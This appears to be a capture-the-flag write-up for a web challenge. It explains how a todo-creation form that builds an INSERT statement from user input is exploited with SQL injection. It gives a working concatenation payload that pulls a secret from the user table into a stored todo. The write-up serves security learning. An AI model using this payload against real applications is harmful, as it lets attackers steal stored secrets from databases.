

1. Register a new user and sign in, now we are allowed to create a todo, list todos and list employee.
2. In the todo creation page we have an input box to some text.
3. Try to create a todo. It result in internal error with ``'``, but ``''`` works.
4. There may be tables ``todo``, ``user`` in databases.

The todo creation is to insert a record into the ``todo`` table, the SQL would be like ``INSERT INTO todo VALUES (userid, 'content')``.

Tried out the following line

```
'||(select secret from user where secret like 'pico%' limit 1)||'
```

The insert SQL becomes

```
INSERT INTO todos VALUES (userid, ''||(select secret from user where secret like 'pico%' limit 1)||''
```

Now go to ``Your Todos``, the flag is displayed.
